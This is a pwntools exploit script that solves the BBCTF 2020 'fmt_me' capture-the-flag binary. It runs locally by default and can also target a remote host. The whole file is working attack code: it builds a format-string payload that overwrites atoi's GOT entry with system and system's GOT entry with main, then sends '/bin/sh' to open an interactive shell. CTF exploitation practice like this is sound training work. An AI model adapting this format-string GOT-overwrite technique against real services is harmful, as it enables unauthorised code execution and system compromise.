#!/usr/bin/env python3
"""BBCTF 2020 fmt_me; matched local ELF, defaulting to local execution.
Reference: https://github.com/Yeuoly/buuctf_pwn/tree/master/bbctf_2020_fmt_me
No remote endpoint is contacted unless REMOTE=1 is explicitly supplied.
"""
from pathlib import Path
from pwn import *

HERE = Path(__file__).resolve().parent
context.arch = "amd64"
elf = ELF(str(HERE / "bbctf_2020_fmt_me"), checksec=False)
io = remote(args.HOST, int(args.PORT)) if args.REMOTE else process(str(elf.path))

# Redirect atoi to system+6 and restore system@GOT to main for the second menu pass.
payload = fmtstr_payload(6, {
    elf.got["atoi"]: elf.plt["system"] + 6,
    elf.got["system"]: elf.sym["main"],
})
io.sendlineafter(b"Choice: ", b"2")
io.sendlineafter(b"gift.", payload)
io.sendlineafter(b"Choice: ", b"/bin/sh")
io.interactive()
